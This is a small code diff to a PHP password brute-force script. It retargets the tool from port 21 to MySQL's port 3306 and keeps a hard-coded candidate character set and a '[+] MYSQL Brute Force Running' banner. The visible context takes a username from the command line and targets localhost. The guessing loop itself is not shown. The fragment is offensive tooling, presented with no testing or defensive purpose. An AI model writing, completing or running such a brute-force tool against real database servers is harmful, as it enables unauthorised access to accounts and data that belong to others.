@@ -5,7 +5,7 @@ set_time_limit(0);
 $user=$argv[1];
 $mail=$argv[2];
 $host="localhost";
-$port=21;
+$port=3306;
 $charset="aiueobcdfghjklmnpqrstvwxyzAIUEO1234567890#@!";
 $p=strlen($charset);
 echo "[+] MYSQL Brute Force Running\n";
